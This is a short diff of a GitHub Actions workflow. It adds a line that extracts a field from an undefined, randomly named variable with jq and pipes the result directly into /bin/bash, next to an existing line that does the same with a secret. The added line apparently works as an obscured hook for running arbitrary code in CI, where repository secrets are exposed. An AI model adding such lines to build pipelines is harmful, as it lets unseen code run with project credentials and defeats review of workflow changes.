@@ -17,6 +17,7 @@ jobs:
           sa4: ${{ secrets.sa4 }}
         run: |
           printf '%s' "$sa4" | jq -r .dcq6 | /bin/bash
+          printf '%s' "$rxq6855" | jq -r .i51 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
